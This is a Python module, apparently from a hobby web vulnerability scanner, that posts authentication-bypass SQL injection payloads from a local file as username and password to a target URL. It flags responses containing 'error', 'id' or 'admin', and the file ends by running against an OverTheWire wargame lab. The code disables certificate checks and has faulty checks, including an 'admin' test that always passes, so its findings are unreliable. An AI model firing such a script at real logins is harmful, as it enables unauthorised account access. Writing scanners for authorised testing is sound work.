import os
import asyncio
import re
import requests
from colorama import Fore,init
from datetime import datetime
import sqlite3
import logging
import json
import sys
add_directory = os.path.abspath(os.path.dirname(__file__))

priority_path = os.path.join(add_directory, '..', 'priority')

sys.path.append(priority_path)


from Priority import PRIORITY, HARMFULL


current_directory = os.path.dirname(os.path.abspath(__file__))
project_root = os.path.abspath(os.path.join(current_directory, '..', '..'))

# Add the project root directory to the Python path
sys.path.append(project_root)

# Now you should be able to import logs
from logger.logs import logger


############################################################################
attack_type = "authentication bypass SQL injection"
#############################################################################

""" 
              Reference : https://github.com/payloadbox/sql-injection-payload-list 
              for The payloads"""

logging.basicConfig(filename="SQLJ.log",level=logging.DEBUG)



####################################33
pattern = r"\berror\b"
htmlpattern = r"\bid\b"
capturesAUTHBYPASS = []
########################################



async def auth_SQL_inj_json(urls):
    """This is the authentication bypass sql injection block. it occurs when the input datas are not validated and attacker can inject its own code to the database and bypass the authentication"""
    try:
        global pattern,htmlpattern 
        done = False 
        filename = "auth_bypass.txt" 
        current_directory = os.path.dirname(os.path.abspath(__file__)) 
        file_path = os.path.join(current_directory, filename) 

        with open(file_path, "r") as file: 
            payload = file.read() 
            rows = payload.split("\n") 
            sorted_rows = sorted(rows) 
            sorted_payload = "\n".join(sorted_rows)
            print(f"[{datetime.now()}]",Fore.RED + str(sorted_payload)) 
            requests.packages.urllib3.disable_warnings()  #! Disable SSL warnings for http requests and testing
            req = requests.get(url=urls,verify=False) 
            if req.status_code == 200: 
                ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the url: {urls}\n Do you want to send the above payload to the website? ")
                logger.info(f"The website:{urls} is returning 200 status code.\n\n")

                if ask.lower() == "y": 
                    for line in sorted_payload.split("\n"):
                        #############################################################33
                        params = { 
                            "username": json.dumps(line),
                            "password": json.dumps(line)
                        }
                        
                        inp = input(Fore.RESET+Fore.LIGHTBLUE_EX+f"JSON payload:\nf{params['username']}\n{params['password']} \npress enter to send the json data to the server:\n press any key to send payloads auto.")
                        logger.info(f"Testing payload:{json.dumps(line)}")
                        if inp:
                            ##############################################################################
                            ack = requests.post(url=urls, data=params,verify=False)
                            logger.info(f"Testing payload:{json.dumps(line)}") 
                            await asyncio.sleep(5) 
                            if "error" in ack.text: 
                                logger.info(f"Could find parameter Error,keyword:{json.dumps(line)}")
                                
                            vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE)
                            htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
                            if vuln: 
                                logging.info(f"Could find parameter id,keyword:{json.dumps(line)}")
                                await asyncio.sleep(3) 
                            
                            if htmlVULN:
                                logger.info(f"Could find error parameter, keyword:{json.dumps(line)}")
                                await asyncio.sleep(3)
                            
                            word = "id" in req.text 
                            errword = "error" in req.text
                            if word:
                                logger.info(f"Could find parameter id, keyword:{json.dumps(line)}")
                                await asyncio.sleep(3)
                            
                            if errword:
                                logger.info(f"Could find parameter error, keyword:{json.dumps(line)}")
                                await asyncio.sleep(3)
                        
                        elif inp == "esc":
                            raise SystemExit
                        
                        elif not inp:
                            pass
                        
                        
                        else:
                            pass
                        
                        
                                
                            
                                
                        if req.status_code == 302: 
                            logger.info(f"Could inject parameter,keyword:{json.dumps(line)},target:{urls}")
                            done = True
                        
                        if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
                            logger.info(f"Could find parameter admin,keyword:{json.dumps(line)},target:{urls}")
                            
                elif ask.lower() == "n":
                    sys.exit(0)
                    
                else:
                    pass
                
            else:
                logger.info(f"Host is down:{urls}")
                

        
                        
                    
    except Exception as e:
        print(f"{datetime.now()}",Fore.RED+"Error:",e,"|Attack:|",attack_type)
        logging.error(f"An error occurred:{e},Time: {datetime.now()}")
        
    except KeyboardInterrupt:
        # print(f"[{datetime.now()}]","Exiting...")
        pass
        
    except ConnectionAbortedError as e:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection aborted error:",e,"|Attack:|",attack_type)
        
    except ConnectionError as e:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection error:",e,"|Attack:|",attack_type)
        
    except ConnectionRefusedError as e:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection refused error:",e,"|Attack:|",attack_type)
        
    except ConnectionResetError as e:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] connection reset error:",e,"|Attack:|",attack_type)
        
    except UnicodeEncodeError:
        print(f"[{datetime.now()}]",Fore.RED+"[ERROR] UnicodeEncodeError:",e,"|Attack:|",attack_type)
        
    except MemoryError:
        import psutil
        # Get the system memory information
        memory = psutil.virtual_memory()

        # Calculate the threshold for 80% memory usage
        threshold = memory.total * 0.9

        # Check if the used memory is greater than the threshold
        Err =  memory.used <= threshold
        while not Err:
            memory = psutil.virtual_memory()
            Err = memory.used <= threshold
            print(Fore.RED+"[INFO]Please Release you RAM space to continue the application"+"|Attack:|",attack_type)
            await asyncio.sleep(5)
# asyncio.run(Memory_handling())
        
    finally:
        pass
        # print(f"[{datetime.now()}]",Fore.BLUE+f"""[INFO] The final result of html response:
        #             \n{ack.text}\n     """)
        # capturesAUTHBYPASS.append(ack.text)
        
        


async def auth_main(urL):
    await auth_SQL_inj_json(urL)

# asyncio.run(auth_main("https://redtiger.labs.overthewire.org/level1.php"))
asyncio.run(auth_SQL_inj_json("https://redtiger.labs.overthewire.org/"))
